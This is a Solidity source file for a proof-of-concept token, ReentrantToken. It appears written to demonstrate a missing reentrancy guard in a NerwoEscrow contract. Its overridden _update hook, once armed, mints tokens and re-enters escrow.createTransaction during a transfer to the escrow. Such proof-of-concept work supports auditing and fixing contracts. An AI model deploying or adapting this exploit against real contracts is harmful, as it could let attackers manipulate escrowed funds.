// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {NerwoEscrow} from "@nerwo/contracts/NerwoEscrow.sol";

/**
 * @notice ERC20 that, on the first transferFrom, re-enters NerwoEscrow.createTransaction
 *         to demonstrate the missing nonReentrant guard.
 */
contract ReentrantToken is ERC20 {
    NerwoEscrow public escrow;
    address public reentryFreelancer;
    uint256 public reentryAmount;
    bool public armed;
    uint256 public reentryTransactionID;

    constructor() ERC20("ReentrantToken", "RNT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function arm(NerwoEscrow _escrow, address _freelancer, uint256 _amount) external {
        escrow = _escrow;
        reentryFreelancer = _freelancer;
        reentryAmount = _amount;
        armed = true;
    }

    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);

        if (armed && to == address(escrow)) {
            armed = false;
            _mint(address(this), reentryAmount);
            _approve(address(this), address(escrow), reentryAmount);
            reentryTransactionID = escrow.createTransaction(IERC20(address(this)), reentryAmount, reentryFreelancer);
        }
    }
}
